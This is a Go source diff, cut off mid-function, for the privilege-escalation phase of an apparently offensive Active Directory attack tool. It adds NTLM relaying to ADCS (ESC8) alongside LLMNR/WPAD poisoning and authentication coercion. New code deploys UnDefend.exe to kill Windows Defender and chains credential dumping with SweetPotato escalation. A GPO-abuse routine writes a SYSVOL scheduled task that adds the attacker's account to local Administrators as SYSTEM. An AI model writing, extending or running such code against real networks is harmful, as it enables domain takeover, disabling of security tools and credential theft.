@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"time"
@@ -27,6 +28,23 @@ const (
 	DeltaNoise
 )
 
+func (d DeltaClass) String() string {
+	switch d {
+	case DeltaNone:
+		return "none"
+	case DeltaCredential:
+		return "credential"
+	case DeltaEdge:
+		return "edge"
+	case DeltaPath:
+		return "path"
+	case DeltaNoise:
+		return "noise"
+	default:
+		return fmt.Sprintf("unknown(%d)", int(d))
+	}
+}
+
 func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, executePaths bool) *core.ToolResult {
 	result := &core.ToolResult{Success: true}
 
@@ -45,6 +63,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 	}
 
 	maxIter := 5
+	lpeAttempted := make(map[string]bool)
 
 	for iter := 0; iter < maxIter; iter++ {
 		credsBefore := len(state.Creds)
@@ -69,9 +88,9 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 				WPAD:      true,
 			}
 			if err := runtime.StartResponder(ctx, respCfg); err != nil {
-				fmt.Printf("[!] Failed to start Responder: %v\n", err)
+				utils.StepWarn(fmt.Sprintf("Failed to start Responder: %v", err))
 			} else {
-				fmt.Printf("[+] Responder started on eth0 (LLMNR/NBT-NS/WPAD poisoning)\n")
+				utils.StepOk("Responder started on eth0 (LLMNR/NBT-NS/WPAD poisoning)")
 			}
 
 			// Start relay as receiver
@@ -84,9 +103,28 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 				HTTPServer:  true,
 			}
 			if err := runtime.StartRelay(ctx, relayCfg); err != nil {
-				fmt.Printf("[!] Failed to start relay: %v\n", err)
+				utils.StepWarn(fmt.Sprintf("Failed to start relay: %v", err))
 			} else {
-				fmt.Printf("[+] NTLM relay started on 0.0.0.0 → ldap://%s\n", host.IP)
+				utils.StepOk(fmt.Sprintf("NTLM relay started on 0.0.0.0 → ldap://%s", host.IP))
+			}
+
+			// ESC8: secondary relay targeting ADCS HTTP endpoint
+			adcsWebURL := detectADCSWebEnrollment(state, host.IP)
+			if adcsWebURL != "" {
+				esc8Cfg := core.RelayConfig{
+					ID:          "ntlmrelayx-esc8",
+					Label:       "ESC8 ADCS Relay",
+					InterfaceIP: "0.0.0.0",
+					Target:      adcsWebURL,
+					SMBServer:   false,
+					HTTPServer:  false,
+					ADCSMode:    true,
+				}
+				if err := runtime.StartRelay(ctx, esc8Cfg); err != nil {
+					utils.StepWarn(fmt.Sprintf("Failed to start ESC8 relay: %v", err))
+				} else {
+					utils.StepOk(fmt.Sprintf("ESC8 relay started → %s", adcsWebURL))
+				}
 			}
 
 			// Start coercer to trigger authentications
@@ -101,9 +139,9 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 				Delay:       120 * time.Second,
 			}
 			if err := runtime.StartCoercer(ctx, coercerCfg); err != nil {
-				fmt.Printf("[!] Failed to start coercer: %v\n", err)
+				utils.StepWarn(fmt.Sprintf("Failed to start coercer: %v", err))
 			} else {
-				fmt.Printf("[+] Coercer started, targeting %d host(s)\n", len(coercerTargets))
+				utils.StepOk(fmt.Sprintf("Coercer started, targeting %d host(s)", len(coercerTargets)))
 			}
 
 			// Stop all services on return
@@ -141,16 +179,25 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 			resolver.AttachResolverPipeline(ctx, runtime, state, resolvers...)
 		}
 
+		ldapHost := host.IP
+		if dc := findDC(state, domain); dc.IP != "" {
+			ldapHost = dc.IP
+		}
+
 		// ── LDAP checks ──────────────────────────────────────────
 		provider := NewNetExecProvider(core.ProviderConfig{
+			Host: ldapHost, Domain: domain,
+			Username: user, Password: pass, Hash: hash,
+		})
+		mssqlProvider := NewNetExecProvider(core.ProviderConfig{
 			Host: host.IP, Domain: domain,
 			Username: user, Password: pass, Hash: hash,
 		})
 
 		// GPP passwords (quick nxc module check)
-		fmt.Println("[*] Checking GPP passwords in SYSVOL...")
+		utils.Step("Checking GPP passwords in SYSVOL...")
 		gppR := exec.Execute(ctx, core.Action{
-			Target: core.HostRef{Name: host.IP, Domain: domain},
+			Target: core.HostRef{Name: ldapHost, Domain: domain},
 			Method: "ldap", Artifact: "-M", Arguments: []string{"gpp_password"},
 			Timeout: 30 * time.Second,
 		})
@@ -164,9 +211,9 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		}
 
 		// ADCS vulnerable template enumeration
-		fmt.Println("[*] Checking ADCS vulnerable templates...")
+		utils.Step("Checking ADCS vulnerable templates...")
 		adcsR := exec.Execute(ctx, core.Action{
-			Target: core.HostRef{Name: host.IP, Domain: domain},
+			Target: core.HostRef{Name: ldapHost, Domain: domain},
 			Method: "ldap", Artifact: "-M", Arguments: []string{"adcs"},
 			Timeout: 30 * time.Second,
 		})
@@ -180,9 +227,9 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		}
 
 		// RBCD check
-		fmt.Println("[*] Checking RBCD...")
+		utils.Step("Checking RBCD...")
 		rbcdR := exec.Execute(ctx, core.Action{
-			Target: core.HostRef{Name: host.IP, Domain: domain},
+			Target: core.HostRef{Name: ldapHost, Domain: domain},
 			Method: "ldap", Artifact: "-M", Arguments: []string{"rbcd"},
 			Timeout: 30 * time.Second,
 		})
@@ -196,7 +243,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		}
 
 		// ── ACL enumeration via daclread ──────────────────────────
-		fmt.Println("[*] Enumerating ACL privilege edges (daclread)...")
+		utils.Step("Enumerating ACL privilege edges (daclread)...")
 		targets := highValueTargets(state)
 		if len(targets) == 0 {
 			// Fall back to common targets if state is sparse
@@ -207,16 +254,16 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		for _, t := range targets {
 			edges, err := provider.EnumerateACLs(ctx, t)
 			if err != nil {
-				fmt.Printf("[!] daclread failed for %s: %v\n", t, err)
+				utils.StepWarn(fmt.Sprintf("daclread failed for %s: %v", t, err))
 				continue
 			}
+			edges = dedupEdges(edges, state.Edges)
 			if len(edges) > 0 {
 				state.Edges = append(state.Edges, edges...)
 				edgeCount += len(edges)
-				fmt.Printf("[+] %d ACE(s) found on %s\n", len(edges), t)
+				utils.StepOk(fmt.Sprintf("%d ACE(s) found on %s", len(edges), t))
 				for _, e := range edges {
-					fmt.Printf("      %s → %s → %s\n",
-						e.SourcePrincipal, e.AccessRight, e.TargetPrincipal)
+					utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
 					result.Evidence = append(result.Evidence, core.EvidenceEntry{
 						Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
 						Source: "daclread", Key: e.SourcePrincipal,
@@ -228,50 +275,76 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		}
 
 		// ── MSSQL impersonation edges ───────────────────────────
-		fmt.Println("[*] Checking MSSQL impersonation privileges (mssql_priv)...")
-		mssqlEdges, err := provider.EnumerateMSSQLImpersonations(ctx)
+		utils.Step("Checking MSSQL impersonation privileges (mssql_priv)...")
+		mssqlEdges, err := mssqlProvider.EnumerateMSSQLImpersonations(ctx)
 		if err != nil {
-			fmt.Printf("[!] mssql_priv failed: %v\n", err)
+			utils.StepWarn(fmt.Sprintf("mssql_priv failed: %v", err))
 		} else if len(mssqlEdges) > 0 {
-			state.Edges = append(state.Edges, mssqlEdges...)
-			edgeCount += len(mssqlEdges)
-			fmt.Printf("[+] %d MSSQL privilege edge(s) found\n", len(mssqlEdges))
-			for _, e := range mssqlEdges {
-				fmt.Printf("      %s → %s → %s [exploit=%.1f noise=%.1f]\n",
-					e.SourcePrincipal, e.AccessRight, e.TargetPrincipal,
-					e.Exploitability, e.Noise)
-				result.Evidence = append(result.Evidence, core.EvidenceEntry{
-					Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-					Source: "mssql_priv", Key: e.SourcePrincipal,
-					Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
-					Confidence: e.Confidence, Timestamp: time.Now(),
-				})
+			mssqlEdges = dedupEdges(mssqlEdges, state.Edges)
+			if len(mssqlEdges) == 0 {
+				utils.StepInfo("No new MSSQL impersonation edges found")
+			} else {
+				state.Edges = append(state.Edges, mssqlEdges...)
+				edgeCount += len(mssqlEdges)
+				utils.StepOk(fmt.Sprintf("%d MSSQL privilege edge(s) found", len(mssqlEdges)))
+				for _, e := range mssqlEdges {
+					utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
+					result.Evidence = append(result.Evidence, core.EvidenceEntry{
+						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+						Source: "mssql_priv", Key: e.SourcePrincipal,
+						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
+						Confidence: e.Confidence, Timestamp: time.Now(),
+					})
+				}
 			}
 		} else {
-			fmt.Println("[*] No MSSQL impersonation edges found")
+			utils.StepInfo("No MSSQL impersonation edges found")
+		}
+
+		// ── MSSQL linked server edges ──────────────────────────
+		utils.Step("Checking MSSQL linked servers...")
+		linkedEdges, err := mssqlProvider.EnumerateMSSQLLinkedServers(ctx)
+		if err != nil {
+			utils.StepWarn(fmt.Sprintf("MSSQL linked server enumeration failed: %v", err))
+		} else if len(linkedEdges) > 0 {
+			linkedEdges = dedupEdges(linkedEdges, state.Edges)
+			if len(linkedEdges) > 0 {
+				state.Edges = append(state.Edges, linkedEdges...)
+				edgeCount += len(linkedEdges)
+				utils.StepOk(fmt.Sprintf("%d MSSQL linked server(s) found", len(linkedEdges)))
+				for _, e := range linkedEdges {
+					utils.Finding(e.SourcePrincipal, e.AccessRight)
+					result.Evidence = append(result.Evidence, core.EvidenceEntry{
+						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+						Source: "mssql_linked", Key: e.SourcePrincipal,
+						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
+						Confidence: e.Confidence, Timestamp: time.Now(),
+					})
+				}
+			}
+		} else {
+			utils.StepInfo("No MSSQL linked servers found")
 		}
 
 		// ── ADCS certificate template edges ──────────────────────
-		fmt.Println("[*] Enumerating ADCS certificate templates (certipy-find)...")
+		utils.Step("Enumerating ADCS certificate templates (certipy-find)...")
 		adcsTemplates, err := provider.EnumerateADCSTemplates(ctx)
 		if err != nil {
-			fmt.Printf("[!] certipy-find failed: %v\n", err)
+			utils.StepWarn(fmt.Sprintf("certipy-find failed: %v", err))
 		} else if len(adcsTemplates) > 0 {
-			fmt.Printf("[+] %d ADCS template(s) found\n", len(adcsTemplates))
+			utils.StepOk(fmt.Sprintf("%d ADCS template(s) found", len(adcsTemplates)))
 			for _, t := range adcsTemplates {
 				if t.Vuln == "" {
 					continue
 				}
 				adcsEdges := adcsEdgeSet(t, domain, host.IP, false)
+				adcsEdges = dedupEdges(adcsEdges, state.Edges)
 				state.Edges = append(state.Edges, adcsEdges...)
 				edgeCount += len(adcsEdges)
 				if len(adcsEdges) > 0 {
-					fmt.Printf("      %s [%s] → %d edge(s)\n",
-						t.Name, t.Vuln, len(adcsEdges))
+					utils.Finding(fmt.Sprintf("%s [%s]", t.Name, t.Vuln), fmt.Sprintf("%d edge(s)", len(adcsEdges)))
 					for _, e := range adcsEdges {
-						fmt.Printf("        %s → %s [exploit=%.1f noise=%.1f]\n",
-							e.SourcePrincipal, e.TargetPrincipal,
-							e.Exploitability, e.Noise)
+						utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
 						result.Evidence = append(result.Evidence, core.EvidenceEntry{
 							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
 							Source: "certipy-find", Key: e.SourcePrincipal,
@@ -282,7 +355,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 				}
 			}
 		} else {
-			fmt.Println("[*] No ADCS templates found")
+			utils.StepInfo("No ADCS templates found")
 		}
 
 		// ── Relay capture edges ───────────────────────────────────
@@ -293,10 +366,9 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 				if len(drained) > 0 {
 					state.Edges = append(state.Edges, drained...)
 					edgeCount += len(drained)
-					fmt.Printf("[+] %d new relay capture edge(s) materialized\n", len(drained))
+					utils.StepOk(fmt.Sprintf("%d new relay capture edge(s) materialized", len(drained)))
 					for _, e := range drained {
-						fmt.Printf("      %s → %s [%s]\n",
-							e.SourcePrincipal, e.TargetPrincipal, e.AccessRight)
+						utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
 						result.Evidence = append(result.Evidence, core.EvidenceEntry{
 							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
 							Source: "ntlmrelayx", Key: e.SourcePrincipal,
@@ -310,45 +382,57 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		}
 
 		// ── Delegation edges (unconstrained, constrained, RBCD) ──
-		fmt.Println("[*] Enumerating delegation relationships...")
+		utils.Step("Enumerating delegation relationships...")
 		delegEdges, err := provider.EnumerateDelegation(ctx)
 		if err != nil {
-			fmt.Printf("[!] Delegation enumeration failed: %v\n", err)
+			utils.StepWarn(fmt.Sprintf("Delegation enumeration failed: %v", err))
 		} else if len(delegEdges) > 0 {
-			state.Edges = append(state.Edges, delegEdges...)
-			edgeCount += len(delegEdges)
-			fmt.Printf("[+] %d delegation edge(s) found\n", len(delegEdges))
-			for _, e := range delegEdges {
-				fmt.Printf("      %s → %s [%s]\n",
-					e.SourcePrincipal, e.TargetPrincipal, e.AccessRight)
-				result.Evidence = append(result.Evidence, core.EvidenceEntry{
-					Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-					Source: "delegation", Key: e.SourcePrincipal,
-					Value:      fmt.Sprintf("%s → %s [%s]", e.SourcePrincipal, e.TargetPrincipal, e.AccessRight),
-					Confidence: e.Confidence, Timestamp: time.Now(),
-				})
+			delegEdges = dedupEdges(delegEdges, state.Edges)
+			if len(delegEdges) == 0 {
+				utils.StepInfo("No new delegation relationships found")
+			} else {
+				state.Edges = append(state.Edges, delegEdges...)
+				edgeCount += len(delegEdges)
+				utils.StepOk(fmt.Sprintf("%d delegation edge(s) found", len(delegEdges)))
+				for _, e := range delegEdges {
+					utils.Finding(e.SourcePrincipal, fmt.Sprintf("%s [%s]", e.TargetPrincipal, e.AccessRight))
+					result.Evidence = append(result.Evidence, core.EvidenceEntry{
+						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+						Source: "delegation", Key: e.SourcePrincipal,
+						Value:      fmt.Sprintf("%s → %s [%s]", e.SourcePrincipal, e.TargetPrincipal, e.AccessRight),
+						Confidence: e.Confidence, Timestamp: time.Now(),
+					})
+				}
 			}
 		} else {
-			fmt.Println("[*] No delegation relationships found")
+			utils.StepInfo("No delegation relationships found")
 		}
 
 		// ── BloodHound graph enrichment ────────────────────────────
-		fmt.Println("[*] Enumerating BloodHound graph (bloodhound-python)...")
+		utils.Step("Enumerating BloodHound graph (bloodhound-python)...")
 		bhDir, bhErr := os.MkdirTemp("", "adpack-bh-*")
 		if bhErr == nil {
 			defer os.RemoveAll(bhDir)
+			bhDCIP := host.IP
+			bhDCHost := ""
+			if dc := findDC(state, domain); dc.IP != "" {
+				bhDCIP = dc.IP
+				if dc.Hostname != "" {
+					bhDCHost = dc.Hostname + "." + domain
+				}
+			}
 			bhCfg := bloodhound.CollectConfig{
 				Domain:    domain,
 				Username:  user,
 				Password:  pass,
 				Hash:      hash,
-				DCHost:    host.Hostname + "." + domain,
-				DNSHost:   host.IP,
+				DCHost:    bhDCHost,
+				DNSHost:   bhDCIP,
 				OutputDir: bhDir,
 				Methods:   bloodhound.DefaultMethods,
 			}
 			if bhErr = bloodhound.CollectAndIngest(ctx, bhCfg, state); bhErr != nil {
-				fmt.Printf("[!] BloodHound ingestion failed: %v\n", bhErr)
+				utils.StepWarn(fmt.Sprintf("BloodHound ingestion failed: %v", bhErr))
 			} else {
 				bhCount := len(state.Edges)
 				bhTotal := 0
@@ -357,8 +441,8 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 						bhTotal++
 					}
 				}
-				fmt.Printf("[+] BloodHound merged: %d users, %d groups, %d computers, %d BH edges (total %d edges)\n",
-					len(state.Users), len(state.Groups), len(state.Computers), bhTotal, bhCount)
+				utils.StepOk(fmt.Sprintf("BloodHound merged: %d users, %d groups, %d computers, %d BH edges (total %d edges)",
+					len(state.Users), len(state.Groups), len(state.Computers), bhTotal, bhCount))
 				result.Evidence = append(result.Evidence, core.EvidenceEntry{
 					Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
 					Source: "bloodhound", Key: "ingested",
@@ -367,50 +451,50 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 				})
 			}
 		} else {
-			fmt.Printf("[!] Cannot create temp dir for BloodHound: %v\n", bhErr)
+			utils.StepWarn(fmt.Sprintf("Cannot create temp dir for BloodHound: %v", bhErr))
 		}
 
 		// ── Weighted path planning (baseline) ──────────────────────
-		var availCaps []string
-		if tools.NetExec.Available() {
-			availCaps = append(availCaps, "nxc")
-		}
+		availCaps := getAvailableCaps()
 		if runtime != nil {
 			health := runtimeHealthSummary(runtime)
-			fmt.Printf("[*] Runtime: %s\n", health)
+			utils.StepInfo(fmt.Sprintf("Runtime: %s", health))
 		}
-		baselinePlans := runPlanning(state, result, edgeCount, availCaps)
+		baselinePlans := runPlanning(state, result, availCaps)
+		latestPlans := baselinePlans
 
-		// ── SUB-PHASE 1: Pre-evasion ──────────────────────────
-		// UnDefend (no admin needed, blocks Defender updates).
-		// Then PhantomKiller (needs admin, BYOVD EDR kill via BootRepair.sys).
-		isBypass := IsBypassProfile(evasionProfile)
-		if isBypass {
-			runPreEvasion(ctx, state, host, exec, result)
-		}
+		// ── SUB-PHASE 1: SYSTEM check + credential dump ──────────
+		gotSystem := doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "system_check")
 
-		// ── SUB-PHASE 2: SYSTEM check via smbexec → atexec ───
-		gotSystem := false
-		r := exec.Execute(ctx, core.Action{
-			Target: core.HostRef{Name: host.IP, Domain: domain},
-			Method: "system_check", Timeout: 45 * time.Second,
-		})
-		if r.Success {
-			fmt.Printf("[+] SYSTEM access confirmed on %s (%s)\n", host.IP, r.Method)
-			gotSystem = true
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-				Source: r.Method, Key: host.IP, Value: "SYSTEM",
-				Confidence: 1.0, RawOutput: r.Output, Timestamp: time.Now(),
-			})
-		} else {
-			fmt.Printf("[!] No SYSTEM context obtained on %s via smbexec/atexec\n", host.IP)
+		// ── SUB-PHASE 2: AV kill + deep credential dump ──────
+		// Disable Defender via UnDefend, then cascade through available dump tools.
+		if gotSystem {
+			runUnDefendKill(ctx, state, host, exec, domain, user, pass, result)
+			runDeepCredDump(ctx, state, host, exec, domain, user, pass, result)
 		}
 
-		// ── SUB-PHASE 3: Local LPE chain (supplementary) ──────
+		// ── SUB-PHASE 3: GPO abuse (edit Settings on GPO to run as SYSTEM) ──
 		if !gotSystem {
-			runLocalLPEChain(ctx, state, host, exec, result)
+			runGPOAbuse(ctx, state, host, exec, domain, user, pass, result)
 		}
+
+		// ── SUB-PHASE 4: Re-check SYSTEM (GPO abuse may have elevated us) ─
+		if !gotSystem {
+			gotSystem = doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "gpo_abuse")
+		}
+
+		// ── SUB-PHASE 5: Local LPE chain (supplementary) ──────
+		if !gotSystem {
+			runLocalLPEChain(ctx, state, host, exec, lpeAttempted, result)
+		}
+
+		// ── SUB-PHASE 6: Final SYSTEM re-check after LPE ──────
+		if !gotSystem {
+			doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "local_lpe")
+		}
+
+		// ── SUB-PHASE 7: Child-to-parent domain escalation ────
+		runChildToParentEscalation(state, result)
 
 		// ── Runtime edge drain + replanning ───────────────────────
 		if cap(relayEdges) > 0 {
@@ -420,10 +504,9 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 				if len(drained) > 0 {
 					state.Edges = append(state.Edges, drained...)
 					edgeCount += len(drained)
-					fmt.Printf("[+] %d new runtime capture edge(s) materialized during execution\n", len(drained))
+					utils.StepOk(fmt.Sprintf("%d new runtime capture edge(s) materialized during execution", len(drained)))
 					for _, e := range drained {
-						fmt.Printf("      %s → %s [%s] (conf=%.1f)\n",
-							e.SourcePrincipal, e.TargetPrincipal, e.AccessRight, e.Confidence)
+						utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
 						result.Evidence = append(result.Evidence, core.EvidenceEntry{
 							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
 							Source: "runtime", Key: e.SourcePrincipal,
@@ -441,8 +524,9 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		}
 
 		// Replan if new edges were added
-		if edgeCount > 0 {
-			newPlans := runPlanning(state, result, edgeCount, availCaps)
+		if len(state.Edges) > 0 {
+			newPlans := runPlanning(state, result, availCaps)
+			latestPlans = newPlans
 			if len(newPlans) > 0 && len(baselinePlans) > 0 {
 				for target, plan := range newPlans {
 					if old, ok := baselinePlans[target]; !ok || plan.TotalCost < old.TotalCost {
@@ -454,11 +538,11 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		}
 
 		// ── Optional path execution ────────────────────────────
-		if executePaths && len(baselinePlans) > 0 {
+		if executePaths && len(latestPlans) > 0 {
 			fmt.Println("\n[*] Executing best planned paths (reconciliation-gated)...")
 			ctx2, cancel2 := context.WithCancel(context.Background())
 			defer cancel2()
-			executed := ExecuteBestPaths(ctx2, state, baselinePlans, host.IP, result)
+			executed := ExecuteBestPaths(ctx2, state, latestPlans, host.IP, result)
 			if executed > 0 {
 				fmt.Printf("[+] Path execution: %d steps completed\n", executed)
 			}
@@ -479,7 +563,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		}
 
 		delta := classifyDelta(credsBefore, edgesBefore, state)
-		fmt.Printf("[*] Privesc iteration %d/%d complete: delta=%v\n", iter+1, maxIter, delta)
+		fmt.Printf("[*] Privesc iteration %d/%d complete: delta=%s\n", iter+1, maxIter, delta)
 
 		switch delta {
 		case DeltaNone, DeltaNoise:
@@ -520,6 +604,54 @@ func selectAVPipeline(detected map[string]string) string {
 		}
 	}
 	return ""
+}
+
+// runUnDefendKill deploys UnDefend.exe and runs --kill to disable Defender.
+// Requires admin/SYSTEM on target. Safe to run even if Defender isn't present.
+func runUnDefendKill(ctx context.Context, state *core.ADState, host core.Host,
+	exec core.Executor, domain, user, pass string, result *core.ToolResult) {
+
+	if !tools.UnDefend.Available() {
+		utils.StepWarn("UnDefend.exe not found, skipping AV kill")
+		return
+	}
+
+	utils.Step("Deploying UnDefend.exe --kill to disable Defender...")
+
+	remoteDir := `C:\Windows\Temp\`
+	deployR := exec.Execute(ctx, core.Action{
+		Artifact: "UnDefend.exe", Method: "put",
+		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
+	})
+	if !deployR.Success {
+		utils.StepWarn(fmt.Sprintf("UnDefend deploy failed: %s", deployR.Error))
+		return
+	}
+	remotePath := deployR.Output
+
+	target := tools.NetExecTarget{
+		Protocol: "smb", Host: host.IP,
+		Domain: domain, Username: user, Password: pass,
+	}
+	cr, err := tools.UnDefend.ExecRemote(ctx, target, remotePath, true)
+	if err != nil || !cr.Success {
+		utils.StepWarn(fmt.Sprintf("UnDefend --kill failed: %v", err))
+	} else {
+		utils.StepOk("UnDefend --kill executed (Defender disabled)")
+	}
+
+	exec.Execute(ctx, core.Action{
+		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
+	})
+
+	result.Evidence = append(result.Evidence, core.EvidenceEntry{
+		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+		Source: "undefend", Key: host.IP, Value: "Defender killed via UnDefend --kill",
+		Confidence: 0.85, Timestamp: time.Now(),
+	})
+
+	fmt.Println("[*] Waiting 8s for Defender termination...")
+	time.Sleep(8 * time.Second)
 }
 
 func runPreEvasion(ctx context.Context, state *core.ADState, host core.Host,
@@ -622,8 +754,7 @@ func runUnDefendDirect(ctx context.Context, host core.Host, domain, user, pass, 
 		Protocol: "smb", Host: host.IP,
 		Domain: domain, Username: user, Password: pass, Hash: hash,
 	}
-	killR, _ := tools.UnDefend.ExecRemote(ctx, target, remotePath, true)
-	_ = killR
+	tools.UnDefend.ExecRemote(ctx, target, remotePath, true)
 
 	exec.Execute(ctx, core.Action{
 		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
@@ -767,10 +898,271 @@ sc.exe start %s
 // ── SUB-PHASE 3: Local LPE ─────────────────────────────────
 
 func runLocalLPEChain(ctx context.Context, state *core.ADState, host core.Host,
-	exec core.Executor, result *core.ToolResult) {
+	exec core.Executor, lpeAttempted map[string]bool, result *core.ToolResult) {
 
-	if tools.MiniPlasma.Available() {
+	if lpeAttempted[host.IP] {
+		return
+	}
+	lpeAttempted[host.IP] = true
+
+	// SweetPotato: reliable NETWORK SERVICE → SYSTEM via SeImpersonate
+	domain, user, pass, _ := getCredential(state)
+	runSweetPotatoProbe(ctx, host, exec, domain, user, pass, result)
+
+	// MiniPlasma: Cloud Filter EoP (supplementary)
+	if !hasSystemEvidence(result) && tools.MiniPlasma.Available() {
 		runMiniPlasmaProbe(ctx, host, exec, result)
+	}
+}
+
+func hasSystemEvidence(result *core.ToolResult) bool {
+	for _, ev := range result.Evidence {
+		if ev.Type == core.EvPrivEscalated && strings.Contains(ev.Value, "SYSTEM") {
+			return true
+		}
+	}
+	return false
+}
+
+func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
+	exec core.Executor, domain, user, pass string, result *core.ToolResult) {
+
+	if domain == "" || user == "" || pass == "" {
+		return
+	}
+	if len(state.GPOs) == 0 {
+		fmt.Println("[*] GPO abuse: no GPOs in state to attempt")
+		return
+	}
+
+	dcIP := host.IP
+	if dc := findDC(state, domain); dc.IP != "" {
+		dcIP = dc.IP
+	}
+
+	fmt.Printf("[*] GPO abuse: attempting to add %s to local Administrators via SYSVOL scheduled task (%d GPOs in scope)...\n",
+		user, len(state.GPOs))
+
+	taskName := "AdPackEoP"
+	payload := fmt.Sprintf("net localgroup Administrators %s\\%s /add", domain, user)
+	sysvolPolicy := fmt.Sprintf("%s/Policies", domain)
+
+	for _, gpo := range state.GPOs {
+		if gpo.GUID == "" {
+			continue
+		}
+
+		gpoPath := fmt.Sprintf("%s/%s/Machine", sysvolPolicy, gpo.GUID)
+		schedPath := gpoPath + "/Preferences/ScheduledTasks"
+
+		utils.RunCommandCtx(ctx, "smbclient",
+			[]string{fmt.Sprintf("//%s/SYSVOL", dcIP),
+				"-W", strings.Split(domain, ".")[0],
+				"-U", fmt.Sprintf("%s%%%s", user, pass),
+				"-c", fmt.Sprintf("mkdir %s", schedPath)})
+
+		// Build and write ScheduledTasks.xml
+		taskUID := fmt.Sprintf("{%X-%X-%X-%X-%X}", time.Now().UnixNano(), os.Getpid(), 0, 0, time.Now().UnixMilli()%1000000)
+		xmlContent := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
+<ScheduledTasks clsid="{CC63F200-7309-4dC0-B71E-58672C36B66E}">
+    <Task clsid="{D8896631-F747-47b9-A6F9-1586A01325DA}" name="%s" image="0" changed="%s" uid="%s">
+        <Properties action="C" name="%s" runAs="NT AUTHORITY\System" logonType="S4U">
+            <Task version="1.2">
+                <Settings><Enabled>true</Enabled><StartWhenAvailable>true</StartWhenAvailable></Settings>
+                <Actions Context="Author">
+                    <Execute><Command>cmd.exe</Command><Arguments>/c %s</Arguments></Execute>
+                </Actions>
+                <Triggers>
+                    <RegistrationTrigger><Enabled>true</Enabled><Delay>PT0S</Delay></RegistrationTrigger>
+                </Triggers>
+            </Task>
+        </Properties>
+    </Task>
+</ScheduledTasks>`, taskName, time.Now().Format("2006-01-02 15:04:05"), taskUID, taskName, payload)
+
+		tmpFile := "/tmp/adpack_gpo_task.xml"
+		if err := os.WriteFile(tmpFile, []byte(xmlContent), 0644); err != nil {
+			fmt.Printf("[!] GPO abuse: write temp file: %v\n", err)
+			continue
+		}
+
+		upCR := utils.RunCommandCtx(ctx, "smbclient",
+			[]string{fmt.Sprintf("//%s/SYSVOL", dcIP),
+				"-W", strings.Split(domain, ".")[0],
+				"-U", fmt.Sprintf("%s%%%s", user, pass),
+				"-c", fmt.Sprintf("cd %s; put %s ScheduledTasks.xml", schedPath, tmpFile)})
+		os.Remove(tmpFile)
+
+		if upCR.ExitCode != 0 {
+			continue
+		}
+
+		fmt.Printf("[+] GPO abuse: scheduled task deployed to GPO '%s' (%s)\n", gpo.Name, gpo.GUID)
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+			Source: "gpo_abuse", Key: gpo.GUID,
+			Value:      fmt.Sprintf("scheduled task via GPO %s", gpo.Name),
+			Confidence: 0.8, RawOutput: upCR.Stdout, Timestamp: time.Now(),
+		})
+
+		// Try gpupdate via nxc (best-effort, may fail without admin)
+		gpTarget := tools.NetExecTarget{
+			Protocol: "smb", Host: host.IP,
+			Domain: domain, Username: user, Password: pass,
+		}
+		gpCR, gpErr := tools.NetExec.Run(ctx, gpTarget, "-X", []string{"gpupdate /force"})
